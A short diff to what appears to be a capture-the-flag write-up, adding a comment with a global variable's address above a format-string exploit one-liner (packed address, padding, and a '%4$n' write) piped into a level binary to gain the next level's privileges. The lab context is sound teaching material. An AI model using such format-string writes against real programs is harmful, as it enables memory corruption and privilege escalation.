@@ -115,6 +115,8 @@ and thats our entire exploit:
 
 # As user level3:
 
+    # g_var is at address 0x0804a04c
+
     # Run the program
     (python -c "print('\x08\x04\xa0\x4c'[::-1] + 60 * 'A' + '%4\$n')"; cat) | /home/user/level4/ft_level3
 
